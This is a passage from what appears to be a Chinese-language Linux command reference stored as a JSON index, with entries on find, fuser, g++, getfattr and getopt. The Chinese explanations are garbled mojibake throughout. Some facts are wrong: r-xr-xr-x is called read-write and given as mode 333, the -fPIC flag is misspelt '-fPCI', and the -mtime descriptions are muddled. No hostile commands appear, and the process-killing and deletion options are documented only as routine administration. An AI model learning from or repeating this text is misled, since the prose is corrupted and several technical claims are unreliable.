æ–‡ä»¶å¤§å° æ˜¯ n å•ä½ï¼Œb ä»£è¡¨ 512 ä½å…ƒç»„çš„åŒºå—ï¼Œc è¡¨ç¤ºå­—å…ƒæ•°(å­—èŠ‚)ï¼Œk è¡¨ç¤º kilo bytes(kb)ï¼Œw æ˜¯äºŒä¸ªä½å…ƒç»„, M(Mb), G(Gb), å¯ä¸ + - æ­é…ä½¿ç”¨ã€‚ -type c æ–‡ä»¶ç±»å‹æ˜¯ c çš„æ–‡ä»¶. æ”¯æŒå‚æ•°, d ç›®å½•, c å­—å‹è£…ç½®æ–‡ä»¶, b åŒºå—è£…ç½®æ–‡ä»¶, p å…·åè´®åˆ—, f ä¸€èˆ¬æ–‡ä»¶, l ç¬¦å·è¿ç»“, s socket -pid n process id æ˜¯ n çš„æ–‡ä»¶ -inum n æŒ‡å®š inodenum ä¸ºn -newer file fileä½œä¸ºä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œåˆ—å‡ºæ¯”fileæ›´æ–°çš„æ–‡ä»¶ -user user æ–‡ä»¶å±ä¸»ä¸ºuser -group group æ–‡ä»¶å±ç»„ä¸ºgroup -perm æ–‡ä»¶æƒé™ -maxdepth é€’å½’æŸ¥æ‰¾å±‚æ•° -delete å¯¹äºæ‰€æœ‰æ£€ç´¢åˆ°çš„é¡¹ç›®è¿›è¡Œåˆ é™¤æ“ä½œ -exec æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ -samefile æŸ¥çœ‹æœ‰å“ªäº›ç›¸åŒçš„æ–‡ä»¶, æ¯”å¦‚å½“ä½ çŸ¥é“ä¸€ä¸ªæ–‡ä»¶, æƒ³çŸ¥é“å®ƒæœ‰è¢«å“ªäº›é“¾æ¥äº† ä½ å¯ä»¥ä½¿ç”¨ ( ) å°†è¿ç®—å¼åˆ†éš”ï¼Œå¹¶ä½¿ç”¨ä¸‹åˆ—è¿ç®—: exp1 -and exp2 ! expr -not expr exp1 -or exp2 exp1, exp2 # -and ç­‰ä»·äº -a # -or ç­‰ä»·äº -o å¦‚æ£€ç´¢ /usr ä¸‹æ–‡ä»¶åä»¥ python å¼€å¤´ä¸”ç±»å‹ä¸ºç›®å½•çš„æ–‡ä»¶: find /usr -type d -name 'python*' è¯¥å‘½ä»¤ç­‰åŒäº: find /usr -type d -a -name 'python*' æ›´å¤æ‚çš„ç»„åˆå½¢å¼å¦‚: find / '(' -mmin -5 -o -mtime +50 ')' -a -type f é€‰é¡¹è¯¦è§£ mtime æ–‡ä»¶ä¿®æ”¹æ—¶é—´: -mtime n : åœ¨è¿‡å» n å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶. nä¸ºæ•°å­—ï¼Œè¡¨ç¤ºnå¤©ä¹‹å‰çš„ã€ä¸€å¤©ä¹‹å†…ã€‘è¢«æ”¹åŠ¨è¿‡çš„æ–‡ä»¶ -mtime +n : åˆ—å‡ºnå¤©ä¹‹å‰è¢«æ”¹åŠ¨è¿‡çš„æ–‡ä»¶ã€ä¸åŒ…å«nå¤©ã€‘ -mtime -n : åˆ—å‡ºnå¤©ä¹‹åè¢«æ”¹åŠ¨è¿‡çš„æ–‡ä»¶ã€åŒ…å«nå¤©ã€‘ type æ–‡ä»¶ç±»å‹: -type d ç›®å½• -type c å­—å‹è£…ç½®æ–‡ä»¶ -type b åŒºå—è£…ç½®æ–‡ä»¶ -type p å…·åè´®åˆ— -type f ä¸€èˆ¬æ–‡ä»¶ -type l ç¬¦å·è¿ç»“ -type s socket size æ–‡ä»¶å¤§å°(å¯¹äºç›®å½•æ¥è¯´æ²¡æœ‰æ„ä¹‰): c å­—èŠ‚ k kb M Mb G Gb å¯ä¸ +, - æ­é…ä½¿ç”¨, å¦‚æ£€ç´¢æ–‡ä»¶å¤§å°é«˜äº 1 GB çš„æ–‡ä»¶: find / -size +1G perm æ–‡ä»¶æƒé™ å¦‚æœç´¢ /usr ç›®å½•ä¸‹æ‰€æœ‰æƒé™ä¸º r-xr-xr-xï¼ˆå³ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½åªæœ‰è¯»å†™æƒé™ï¼‰çš„æ–‡ä»¶å’Œç›®å½•ï¼Œ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: find /usr -perm a=rx æˆ–è€…: find /usr -perm u=rx,g=rx,o=rx äº¦å¯ç›´æ¥ä½¿ç”¨æ•°å­—çš„å½¢å¼: find /usr -perm 333 è‹¥ä»…éœ€è¦åŒ¹é…æŸä¸€ä¸ªå­—é›†: # /a=x ä¸­çš„ / è¡¨ç¤ºä»…åŒ¹é…æƒé™å­é›†. å³åªè¦æœ‰æ‰§è¡Œæƒé™å³å¯. find /usr -perm /a=x maxdepth findé»˜è®¤æ˜¯é€’å½’æ£€ç´¢é¡¹ç›®çš„, å¯ä½¿ç”¨ -maxdepth é™åˆ¶é€’å½’æŸ¥æ‰¾å±‚æ•°. å¦‚æœç´¢æ—¶å‘ä¸‹é€’å½’çš„å±‚æ•°æœ€å¤§ä¸º 3: find / -maxdepth 3 exec æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤ å¦‚å°† home ç›®å½•ä¸‹æ‰€æœ‰çš„ py æ–‡ä»¶å¤åˆ¶åˆ° bak ç›®å½•ä¸‹: find ~ -type f -name '*.py' -exec cp {} bak ';' å…¶ä¸­çš„å¤§æ‹¬å·ï¼ˆ{}ï¼‰ä½œä¸ºæ£€ç´¢åˆ°çš„æ–‡ä»¶çš„ å ä½ç¬¦ ï¼Œè€Œåˆ†å·ä½œä¸ºå‘½ä»¤ç»“æŸçš„æ ‡å¿—ã€‚å› ä¸ºåˆ†å·æ˜¯ Shell ä¸­æœ‰ç‰¹æ®Šå«ä¹‰çš„ç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å•å¼•å·æ‹¬èµ·æ¥, æˆ–è€…ç”¨ \\ ä¹Ÿå¯ã€‚ +çš„ä½œç”¨ å¤šæ–‡ä»¶æ‰“åŒ…: # + è¡¨ç¤ºå¤šä¸ªæ–‡ä»¶éƒ½ä¸€èµ·æ‰“åŒ…åœ¨æ­¤å¤„, å¦åˆ™æœ€ç»ˆå‹ç¼©åŒ…å†…åªæœ‰ä¸€ä¸ªpyæ–‡ä»¶ find ~ -type f -name '*.py' -exec tar -czvf py_file.tar.gz {} +","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-find.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-find.html"},{"title":"fuser","text":"å®‰è£…: apt install psmisc æ˜¾ç¤ºå‡ºå½“å‰å“ªä¸ªç¨‹åºåœ¨ä½¿ç”¨ç£ç›˜ä¸Šçš„æŸä¸ªæ–‡ä»¶ã€æŒ‚è½½ç‚¹ã€ç”šè‡³ç½‘ç»œç«¯å£ï¼Œå¹¶ç»™å‡ºç¨‹åºè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ è¯­æ³•: fuser(é€‰é¡¹)(å‚æ•°) è®¿é—®ç±»å‹: - cï¼šä»£è¡¨å½“å‰ç›®å½• - eï¼šå°†æ­¤æ–‡ä»¶ä½œä¸ºç¨‹åºçš„å¯æ‰§è¡Œå¯¹è±¡ä½¿ç”¨ - fï¼šæ‰“å¼€çš„æ–‡ä»¶ã€‚é»˜è®¤ä¸æ˜¾ç¤ºã€‚ - Fï¼šæ‰“å¼€çš„æ–‡ä»¶ï¼Œç”¨äºå†™æ“ä½œã€‚é»˜è®¤ä¸æ˜¾ç¤ºã€‚ - rï¼šæŒ‡ç¤ºè¯¥ç›®å½•ä¸ºè¿›ç¨‹çš„æ ¹ç›®å½• - mï¼šæŒ‡ç¤ºè¿›ç¨‹ä½¿ç”¨è¯¥æ–‡ä»¶è¿›è¡Œå†…å­˜æ˜ å°„ï¼ŒæŠ‘æˆ–è¯¥æ–‡ä»¶ä¸ºå…±äº«åº“æ–‡ä»¶ï¼Œè¢«è¿›ç¨‹æ˜ å°„è¿›å†…å­˜ - sï¼šå°†æ­¤æ–‡ä»¶ä½œä¸ºå…±äº«åº“ï¼ˆæˆ–å…¶ä»–å¯è£…è½½å¯¹è±¡ï¼‰ä½¿ç”¨ å¸¸ç”¨é€‰é¡¹: -aï¼šæ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„æ–‡ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹è¢«è®¿é—®çš„æ–‡ä»¶æ‰ä¼šè¢«æ˜¾ç¤ºã€‚ -cï¼šå’Œ-mä¸€æ ·ï¼Œç”¨äºPOSIXå…¼å®¹ã€‚ -kï¼šæ€æ‰è®¿é—®æ–‡ä»¶çš„è¿›ç¨‹ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®š-signalå°±ä¼šå‘é€SIGKILLä¿¡å·ã€‚ -iï¼šæ€æ‰è¿›ç¨‹ä¹‹å‰è¯¢é—®ç”¨æˆ·ï¼Œå¦‚æœæ²¡æœ‰-kè¿™ä¸ªé€‰é¡¹ä¼šè¢«å¿½ç•¥ã€‚ -lï¼šåˆ—å‡ºæ‰€æœ‰å·²çŸ¥çš„ä¿¡å·åç§°ã€‚ -mï¼šname æŒ‡å®šä¸€ä¸ªæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶æˆ–è€…è¢«æŒ‚è½½çš„å—è®¾å¤‡ï¼ˆåç§°nameï¼‰ã€‚è¿™æ ·æ‰€æœ‰è®¿é—®è¿™ä¸ªæ–‡ä»¶æˆ–è€…æ–‡ä»¶ç³»ç»Ÿçš„è¿›ç¨‹éƒ½ä¼šè¢«åˆ—å‡ºæ¥ã€‚å¦‚æœæŒ‡å®šçš„æ˜¯ä¸€ä¸ªç›®å½•ä¼šè‡ªåŠ¨è½¬æ¢æˆ\"name/\",å¹¶ä½¿ç”¨æ‰€æœ‰æŒ‚è½½åœ¨é‚£ä¸ªç›®å½•ä¸‹é¢çš„æ–‡ä»¶ç³»ç»Ÿã€‚ -nï¼šspace æŒ‡å®šä¸€ä¸ªä¸åŒçš„å‘½åç©ºé—´(space).è¿™é‡Œæ”¯æŒä¸åŒçš„ç©ºé—´æ–‡ä»¶(æ–‡ä»¶åï¼Œæ­¤å¤„é»˜è®¤)ã€tcp(æœ¬åœ°tcpç«¯å£)ã€udp(æœ¬åœ°udpç«¯å£)ã€‚å¯¹äºç«¯å£ï¼Œ å¯ä»¥æŒ‡å®šç«¯å£å·æˆ–è€…åç§°ï¼Œå¦‚æœä¸ä¼šå¼•èµ·æ­§ä¹‰é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ç®€å•è¡¨ç¤ºçš„å½¢å¼ï¼Œä¾‹å¦‚ï¼šname/space (å³å½¢å¦‚:80/tcpä¹‹ç±»çš„è¡¨ç¤º)ã€‚ -sï¼šé™é»˜æ¨¡å¼ï¼Œè¿™æ—¶å€™-u,-vä¼šè¢«å¿½ç•¥ã€‚-aä¸èƒ½å’Œ-sä¸€èµ·ä½¿ç”¨ã€‚ -<signal>ï¼šä½¿ç”¨æŒ‡å®šçš„ä¿¡å·ï¼Œè€Œä¸æ˜¯ç”¨SIGKILLæ¥æ€æ‰è¿›ç¨‹ã€‚å¯ä»¥é€šè¿‡åç§°æˆ–è€…å·ç æ¥è¡¨ç¤ºä¿¡å·(ä¾‹å¦‚-HUP,-1),è¿™ä¸ªé€‰é¡¹è¦å’Œ-kä¸€èµ·ä½¿ç”¨ï¼Œå¦åˆ™ä¼šè¢«å¿½ç•¥ã€‚ -uï¼šåœ¨æ¯ä¸ªPIDåé¢æ·»åŠ è¿›ç¨‹æ‹¥æœ‰è€…çš„ç”¨æˆ·åç§°ã€‚ -vï¼šè¯¦ç»†æ¨¡å¼ã€‚è¾“å‡ºä¼¼pså‘½ä»¤çš„è¾“å‡ºï¼ŒåŒ…å«PID,USER,COMMANDç­‰è®¸å¤šåŸŸ,å¦‚æœæ˜¯å†…æ ¸è®¿é—®çš„é‚£ä¹ˆPIDä¸ºkernel. -V è¾“å‡ºç‰ˆæœ¬å·ã€‚ -4ï¼šä½¿ç”¨IPV4å¥—æ¥å­—,ä¸èƒ½å’Œ-6ä¸€èµ·åº”ç”¨ï¼Œåªåœ¨-nçš„tcpå’Œudpçš„å‘½åå­˜åœ¨æ—¶ä¸è¢«å¿½ç•¥ã€‚ -6ï¼šä½¿ç”¨IPV6å¥—æ¥å­—,ä¸èƒ½å’Œ-4ä¸€èµ·åº”ç”¨ï¼Œåªåœ¨-nçš„tcpå’Œudpçš„å‘½åå­˜åœ¨æ—¶ä¸è¢«å¿½ç•¥ã€‚ - é‡ç½®æ‰€æœ‰çš„é€‰é¡¹ï¼ŒæŠŠä¿¡å·è®¾ç½®ä¸ºSIGKILL. å‚æ•°: æ–‡ä»¶ï¼šå¯ä»¥æ˜¯æ–‡ä»¶åæˆ–è€…TCPã€UDPç«¯å£å· fuserå¯ä»¥å‘é€å®ƒå·²çŸ¥çš„ä¿¡å·ç»™è®¿é—®çš„æŒ‡å®šæ–‡ä»¶è¿›ç¨‹è€Œä»£æ›¿-kå‚æ•°é»˜è®¤å‘é€çš„SIGKILL: [root@_mongodb_117 ~]# fuser -v /root/install.log ç”¨æˆ· è¿›ç¨‹å· æƒé™ å‘½ä»¤ /root/install.log: root 3347 f.... tail [root@_mongodb_117 ~]# fuser -k -SIGHUP /root/install.log /root/install.log: 3347 [root@_mongodb_117 ~]# fuser -v /root/install.log æ€æ‰æ‰“å¼€readmeæ–‡ä»¶çš„ç¨‹åº, è¿™é‡Œï¼Œä¼šåœ¨killä¹‹å‰è¯¢é—®æ˜¯å¦ç¡®å®šã€‚æœ€å¥½åŠ ä¸Š-vä»¥ä¾¿çŸ¥é“å°†è¦æ€é‚£ä¸ªè¿›ç¨‹: $fuser -m -k -i readme","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fuseer.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fuseer.html"},{"title":"g++","text":"ä¸€èˆ¬ç”¨äºç¼–è¯‘C++ é€‰é¡¹: -I <dir> æŒ‡å®šå¤´æ–‡ä»¶æ‰€åœ¨ç›®å½•, ä¼šä¼˜å…ˆæ‰¾æ­¤å¤„æŒ‡å®šçš„ç›®å½• -l <dir> æŒ‡å®šéœ€è¦é“¾æ¥çš„åº“åï¼Œç”¨äºå‘Šè¯‰é“¾æ¥å™¨éœ€è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ å³æŒ‡å®šåŠ¨æ€åº“çš„åç§°(å»æ‰libå‰ç¼€å’Œ.soåç¼€) -L <dir> æŒ‡å®šåŠ¨æ€åº“æœç´¢è·¯å¾„ -f no-lto ç¦ç”¨é“¾æ¥æ—¶ä¼˜åŒ–ï¼ˆLTOï¼‰ å½“ä½¿ç”¨è¯¥é€‰é¡¹ç¼–è¯‘æºä»£ç æ—¶ï¼Œç¼–è¯‘å™¨å°†ä¸ä¼šè¿›è¡Œé“¾æ¥æ—¶ä¼˜åŒ–ï¼Œ è¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ€§èƒ½ä¸Šçš„æŸå¤±ï¼Œä½†ä¹Ÿå¯ä»¥é¿å…æŸäº›é“¾æ¥é”™è¯¯ã€‚ -s hared ç”ŸæˆåŠ¨æ€åº“(.soæ–‡ä»¶),è€Œä¸æ˜¯é™æ€åº“(.aæ–‡ä»¶) -f PIC ç”Ÿæˆä½ç½®æ— å…³ä»£ç (position-independent code), ä½¿å¾—ä»£ç å¯ä»¥åœ¨ä¸åŒçš„å†…å­˜åœ°å€æ‰§è¡Œ,è¿™å¯¹äºåŠ¨æ€åº“æ˜¯å¿…éœ€çš„ -g åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç”Ÿæˆè°ƒè¯•ä¿¡æ¯(debugging information), å¹¶å°†å…¶åµŒå…¥åˆ°æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®æ ‡æ–‡ä»¶ä¸­ã€‚ å¸¦æœ‰è°ƒè¯•ä¿¡æ¯çš„å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥ç”¨è°ƒè¯•å™¨(debugger)æ¥è°ƒè¯•å’Œè·Ÿè¸ªä»£ç  -c ä»…ç¼–è¯‘,ä¸é“¾æ¥ã€‚åªç”Ÿæˆç›®æ ‡æ–‡ä»¶(.oæ–‡ä»¶),ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¯¹äº -c é€‰é¡¹çš„è¯´æ˜ é€šå¸¸g++çš„ä½¿ç”¨æµç¨‹æ˜¯: ç¼–è¯‘æºæ–‡ä»¶(.cæˆ–.cpp)ç”Ÿæˆç›®æ ‡æ–‡ä»¶(.oæ–‡ä»¶),ä½¿ç”¨-cé€‰é¡¹ é“¾æ¥å¤šä¸ªç›®æ ‡æ–‡ä»¶å’Œåº“æ–‡ä»¶,ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶,ä½¿ç”¨-oé€‰é¡¹æŒ‡å®šè¾“å‡ºæ–‡ä»¶ æ‰€ä»¥-cé€‰é¡¹ä½¿å¾—ç¼–è¯‘å’Œé“¾æ¥æˆä¸¤ä¸ªæ­¥éª¤è¿›è¡Œã€‚æ¯”å¦‚: g++ -c hello.c # ä»…ç¼–è¯‘,ç”Ÿæˆhello.o g++ -c main.c # ä»…ç¼–è¯‘,ç”Ÿæˆmain.o g++ hello.o main.o -o hello # é“¾æ¥ç›®æ ‡æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ å¦‚æœä¸ä½¿ç”¨-cé€‰é¡¹,g++ä¼šè‡ªåŠ¨æ‰§è¡Œç¼–è¯‘å’Œé“¾æ¥ä¸¤ä¸ªæ­¥éª¤,ä¾‹å¦‚: g++ hello.c main.c -o hello # ä¼šç¼–è¯‘hello.cå’Œmain.c,ç„¶åé“¾æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶hello ä¾‹-ç”Ÿæˆé™æ€åº“æ–‡ä»¶å’Œå…±äº«åº“æ–‡ä»¶ ç¼–è¯‘myfile.cpp: g++ -c myfile.cpp æ³¨è§£ é™æ€åº“æ–‡ä»¶å’Œå…±äº«åº“æ–‡ä»¶éƒ½æ˜¯ç”±.oç›®æ ‡æ–‡ä»¶ç”Ÿæˆ ç”Ÿæˆå…±äº«åº“æ–‡ä»¶libmy.so: g++ -shared -fPCI -o libmy.so myfile.o æ‰“åŒ…æˆé™æ€åº“æ–‡ä»¶libmy.a: ar -r libmy.a myfile.o # ar: creating libmy.a","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-g-++.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-g-++.html"},{"title":"getfattr","text":"get extended attributes of filesystem objects è·å–æ–‡ä»¶ç³»ç»Ÿæ‰©å±•å±æ€§ä¿¡æ¯(ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/setfattr å‘½ä»¤è®¾ç½®çš„å±æ€§) è¯­æ³•æ ¼å¼: getfattr [å‚æ•°] æ–‡ä»¶å å¸¸ç”¨å‚æ•°ï¼š -d æ˜¾ç¤ºæ‰€æœ‰æ‰©å±•å±æ€§å€¼ -e è®¾ç½®ç¼–ç å€¼ç±»å‹ -h ä¸å¼•ç”¨ç¬¦å·é“¾æ¥ -m åŒ…æ‹¬åç§°åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„å±æ€§ -n æ˜¾ç¤ºå·²å‘½åçš„æ‰©å±•å±æ€§å€¼ -P è·³è¿‡æ‰€æœ‰ç¬¦å·é“¾æ¥ -R é€’å½’å¤„ç†æ‰€æœ‰å­æ–‡ä»¶ --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfattr.html"},{"title":"getopt","text":"getopté€‰é¡¹å­—ç¬¦ä¸²: \"a:b:cd::e\"ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªé€‰é¡¹å­—ç¬¦ä¸²ã€‚å¯¹åº”åˆ°å‘½ä»¤è¡Œå°±æ˜¯-a ,-b ,-c ,-d, -e ã€‚ å†’å·åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å†’å·è¡¨ç¤ºå‚æ•°ï¼Œ ä¸€ä¸ªå†’å·å°±è¡¨ç¤ºè¿™ä¸ªé€‰é¡¹åé¢å¿…é¡»å¸¦æœ‰å‚æ•°ï¼ˆæ²¡æœ‰å¸¦å‚æ•°ä¼šæŠ¥é”™å“¦ï¼‰ï¼Œ ä½†æ˜¯è¿™ä¸ªå‚æ•°å¯ä»¥å’Œé€‰é¡¹è¿åœ¨ä¸€èµ·å†™ï¼Œä¹Ÿå¯ä»¥ç”¨ç©ºæ ¼éš”å¼€ï¼Œæ¯”å¦‚-a123 å’Œ-a 123ï¼ˆä¸­é—´æœ‰ç©ºæ ¼ï¼‰ éƒ½è¡¨ç¤º123æ˜¯-açš„å‚æ•°ï¼› ä¸¤ä¸ªå†’å·çš„å°±è¡¨ç¤ºè¿™ä¸ªé€‰é¡¹çš„å‚æ•°æ˜¯å¯é€‰çš„ï¼Œå³å¯ä»¥æœ‰å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰å‚æ•°ï¼Œ ä½†è¦æ³¨æ„æœ‰å‚æ•°æ—¶ï¼Œå‚æ•°ä¸é€‰é¡¹ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼ˆæœ‰ç©ºæ ¼ä¼šæŠ¥é”™ï¼‰ï¼Œè¿™ä¸€ç‚¹å’Œä¸€ä¸ªå†’å·æ—¶æ˜¯æœ‰åŒºåˆ«çš„ã€‚ -oæˆ–--optionsé€‰é¡¹åé¢æ˜¯å¯æ¥å—çš„çŸ­é€‰é¡¹ï¼Œå¦‚ab:c::ï¼Œè¡¨ç¤ºå¯æ¥å—çš„çŸ­é€‰é¡¹ä¸º-a -b -cï¼Œå…¶ä¸­-aé€‰é¡¹ä¸æ¥å‚æ•°ï¼Œ-bé€‰é¡¹åå¿…é¡»æ¥å‚æ•°ï¼Œ-cé€‰é¡¹çš„å‚æ•°ä¸ºå¯é€‰çš„ -læˆ–--longé€‰é¡¹åé¢æ˜¯å¯æ¥å—çš„é•¿é€‰é¡¹ï¼Œç”¨é€—å·åˆ†å¼€ï¼Œå†’å·çš„æ„ä¹‰åŒçŸ­é€‰é¡¹ã€‚ -né€‰é¡¹åæ¥é€‰é¡¹è§£æé”™è¯¯æ—¶æç¤ºçš„è„šæœ¬åå­— å¸¸ç”¨å‚æ•° -a å…è®¸é•¿é€‰é¡¹ä»¥å•ä¸ªå­—ç¬¦\"-\"å¼€å§‹ -n æŒ‡å®šä¸€ä¸ªç¨‹åºï¼Œä¾›getopt(3)å‡½æ•°è¾“å‡ºé”™è¯¯ä¿¡æ¯æ—¶ä½¿ç”¨ -o è¯†åˆ«å•å­—ç¬¦çš„çŸ­é€‰é¡¹ -q ç¦æ­¢è¾“å‡ºé”™è¯¯ä¿¡æ¯ -l è¯†åˆ«å¤šå­—ç¬¦çš„é•¿é€‰é¡¹ è‡ªå·±å†™è¿‡çš„ä¸€ä¸ªä¾‹å­, è‡³å°‘éœ€è¦ä¸€ä¸ªçŸ­é€‰é¡¹ : #sh ./test.sh -l --warn ww --error ee --info ii --fatal ff # ARGS=\"getopt -o h -l warn:,error:,info:,fatal: -- $@\" # eval set -- \"${ARGS}\" getopt -o h -l warn:,error:,info:,fatal: -- $@ while true do case \"$1\" in --warn) echo \"warn: i am $2\" shift 2 ;; --error) echo \"error: i am $2\" shift 2 ;; --info) echo \"info: i am $2\" shift 2 ;; --fatal) echo \"fatal: i am $2\" shift 2 ;; --) shift break ;; *) echo \"error---$1 $2\" break ;; esac done getoptçš„åŒºåˆ«ä¸åˆ†ç±» ä¸Šè¿°ä¾‹å­æœ‰é—®é¢˜, æ­¤å¤„å†é‡æ–°ä»‹ç»ä¸€ä¸‹. getoptæœ‰ä¸‰ç§ getoptæ ‡å‡†ç‰ˆ: åªèƒ½è¯†åˆ«çŸ­é€‰é¡¹; getoptå¢å¼ºç‰ˆ: çŸ­é€‰é¡¹é•¿é€‰é¡¹çš†å¯; getopts: åªèƒ½è¯†åˆ«çŸ­é€‰é¡¹(ä¸¥æ ¼æ¥è¯´å¯èƒ½ä¹Ÿä¸èƒ½æ”¾åœ¨è¿™) å…¶ä¸­, è¯†åˆ«getoptæ˜¯æ ‡å‡†ç‰ˆè¿˜æ˜¯å¢å¼ºç‰ˆå¯ä½¿ç”¨-T: getopt -T æ ‡å‡†ç‰ˆè¾“å‡ºå¦‚ä¸‹: $ getopt -T -- $ echo $? 0 å¢å¼ºç‰ˆè¾“å‡ºå¦‚ä¸‹: root@67a43e314058:~# getopt -T root@67a43e314058:~# echo $? 4 ä¸‹é¢ä»£ç åŸºäºå¢å¼ºç‰ˆç¼–å†™, æ³¨æ„å¯¹é€‰é¡¹å‚æ•°çš„å®šä¹‰: ARGS=$(getopt -o hu: -l help,user:,age:,name:: -- \"$@\") é•¿é€‰é¡¹ä½¿ç”¨ --long æˆ– -l çš†å¯, æµ‹è¯•: root@67a43e314058:~# sh t_getopt.sh -u yq --name=11 --age 10 ARGS::: -u 'yq' --name '11' --age '10' -- user:yq age:10 name:11 root@67a43e314058:~# sh t_getopt.sh -u yq --name 11 --age 10 ARGS::: -u 'yq' --name '' --age '10' -- '11' user:yq age:10 name: å¯ä»¥çœ‹å‡º --name=11 ä¸ --name 11 çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„, åè€…æ²¡æœ‰æˆåŠŸèµ‹å€¼åˆ°name, è¿™æ˜¯å› ä¸ºgetoptè§£ææ—¶é™å®šä¸º name:: (åŒå†’å·). ä¸¤ä¸ªå†’å·è¡¨ç¤ºå‚æ•°å¯é€‰, åœ¨debian11ä¸Šé»˜è®¤ç©ºæ ¼é€‰æ‹©çš„æ˜¯éé€‰é¡¹å‚æ•°(ä¸çŸ¥å…¶ä»–ç³»ç»Ÿæ˜¯ä¸æ˜¯äº¦æ˜¯). å¦‚æœè¦è§„é¿å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå†’å·è¡¨ç¤ºå‚æ•°å¿…é€‰. æ³¨è§£ æ— å†’å·è¡¨ç¤ºé€‰é¡¹ä¸å¸¦å‚æ•°; ä¸€ä¸ªå†’å·è¡¨ç¤ºé€‰é¡¹å¿…é¡»æŒ‡å®šå‚æ•°; ä¸¤ä¸ªå†’å·è¡¨ç¤ºé€‰é¡¹å‚æ•°å¯é€‰. getoptä½œç”¨è¯´æ˜ ä»ä¸Šä¸€èŠ‚ getoptçš„åŒºåˆ«ä¸åˆ†ç±» çš„ä¾‹å­ä¸­å¯ä»¥çœ‹å‡º, å…¶ä½œç”¨åªæ˜¯å¯¹å‘½ä»¤è¡Œè¾“å…¥çš„å‚æ•°åšäº†ä¸€ä¸ªæ ¡éªŒä¸è§„èŒƒåŒ–, å®é™… eval set -- \"${ARGS}\" å‰åçš„ ARGS éƒ½æ˜¯ä¸€è‡´çš„, é‚£ä¹ˆè¿™å¥eval æ˜¯ä¸æ˜¯å¿…é¡»çš„å‘¢? æ˜¯. eval set -- \"${ARGS}\" çš„ä½œç”¨æ˜¯å°† ${ARGS} ä¸­çš„å­—ç¬¦ä¸²è§£æä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶èµ‹å€¼ç»™è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°ã€‚ \"${ARGS}\" ä½¿ç”¨åŒå¼•å·å°†æ•´ä¸ªå­—ç¬¦ä¸²æ‹¬èµ·æ¥ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿å‚æ•°ä¸­å­˜åœ¨çš„ç©ºæ ¼ä¸ä¼šè¢«è§£é‡Šä¸ºåˆ†éš”ç¬¦ã€‚ set -- \"${ARGS}\" å°† ${ARGS} ä¸­çš„å­—ç¬¦ä¸²æŒ‰ç…§ç©ºæ ¼è¿›è¡Œæ‹†åˆ†ï¼Œå¹¶å°†æ‹†åˆ†åçš„ç»“æœè®¾ç½®ä¸ºè„šæœ¬çš„ä½ç½®å‚æ•°ã€‚ ä½ç½®å‚æ•°æ˜¯è„šæœ¬ä¸­å¯ç”¨äºè®¿é—®ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°çš„ç‰¹æ®Šå˜é‡ï¼Œå®ƒä»¬è¢«å­˜å‚¨åœ¨ $1ã€$2ã€$3 ç­‰å˜é‡ä¸­ã€‚ æ³¨æ„: æ­¤æ—¶çš„ç»“æœæ˜¯ä¸€ä¸ªæ•´ä½“å­—ç¬¦ä¸², è¿˜éœ€è¦ä½¿ç”¨evalæ‰èƒ½å°†å…¶æ‹†åˆ†ä¸ºæ­£å¸¸çš„å¤šä¸ªå‚æ•°å­—ç¬¦ä¸² eval å‘½ä»¤ç”¨äºæ‰§è¡Œç”± set -- \"${ARGS}\" ç”Ÿæˆçš„å‘½ä»¤ï¼Œå°†å…¶ä½œä¸ºæœ‰æ•ˆçš„Shellå‘½ä»¤æ‰§è¡Œã€‚ é€šè¿‡ä½¿ç”¨ eval å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°† ${ARGS} 